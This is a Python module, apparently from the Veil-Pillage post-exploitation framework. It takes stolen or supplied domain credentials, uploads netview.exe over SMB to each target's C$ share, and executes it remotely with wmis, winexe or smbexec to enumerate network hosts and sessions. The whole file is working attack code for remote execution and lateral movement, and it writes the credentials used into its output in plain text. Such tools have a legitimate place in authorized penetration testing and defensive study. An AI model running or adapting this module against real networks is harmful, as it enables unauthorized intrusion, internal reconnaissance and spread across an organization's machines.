"""

Uploads netview.exe to a host and executes it.

Note: this needs to be run under a domain account to make sense!


All credit for Netview goes to Rob Fuller (@mubix)

    https://github.com/mubix/netview
    http://www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/


Module built by @harmj0y

"""

import settings

from lib import command_methods
from lib import smb

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Netview.exe Upload"
        self.description = "Uploads netview.exe and runs it on a host."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    : ["wmis", "[wmis], [winexe], or [smbexec] for triggering"],
                                    "out_file"          : ["netview.txt", "temporary output filename to write to"],
                                    "args"              : ["none", "additional arguments to pass to netview.exe"]}


    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        # grab our options
        triggerMethod = self.required_options["trigger_method"][0]
        out_file = self.required_options["out_file"][0]
        args = self.required_options["args"][0]

        if "\\" not in out_file:
            # otherwise assume it's an absolute path
            out_file = "C:\\Windows\\Temp\\" + out_file 

        # command to invoke netview and output it to a temporary file
        exePath = settings.VEIL_PILLAGE_PATH+"/data/misc/netview.exe"

        # the command to invoke netview.exe
        cmd = "C:\\Windows\\Temp\\netview.exe -o " + out_file

        # see if there are any extra arguments we want to add in
        if args != "none":
            cmd = cmd + " " + args

        for target in self.targets:
 
            # upload the binary to the host at C:\Windows\Temp\
            smb.uploadFile(target, username, password, "C$", "\\Windows\\Temp\\", exePath)
            
            # execute netview.exe
            command_methods.executeCommand(target, username, password, cmd, triggerMethod)

            self.output += "[*] netview.exe uploaded and executed using creds '"+username+":"+password+"' on "+target+" using "+triggerMethod+"\n"
